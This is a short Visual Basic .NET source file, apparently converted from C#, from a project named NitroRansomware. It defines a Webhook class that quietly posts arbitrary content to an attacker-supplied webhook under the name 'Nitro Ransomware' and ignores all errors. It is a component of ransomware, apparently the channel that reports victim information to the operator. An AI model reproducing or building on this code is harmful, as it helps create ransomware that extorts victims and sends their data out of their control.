Imports System.Collections.Generic
Imports System.Net.Http
Namespace NitroRansomware
	Friend Class Webhook
'INSTANT VB NOTE: The variable webhook was renamed since Visual Basic does not allow variables and other class members to have the same name:
		Private webhook_Renamed As String
		Public Sub New(ByVal userWebhook As String)
			webhook_Renamed = userWebhook
		End Sub
		Public Sub Send(ByVal content As String)

			Dim data As New Dictionary(Of String, String)() From {{"content", content }, {"username", "Nitro Ransomware" }, {"avatar_url", "https://i.ibb.co/0frTD92/discord-avatar-512.png"}}

			Try
				Using client As New HttpClient()
					client.PostAsync(webhook_Renamed, New FormUrlEncodedContent(data)).GetAwaiter().GetResult()
				End Using

			Catch
			End Try

		End Sub
	End Class
End Namespace
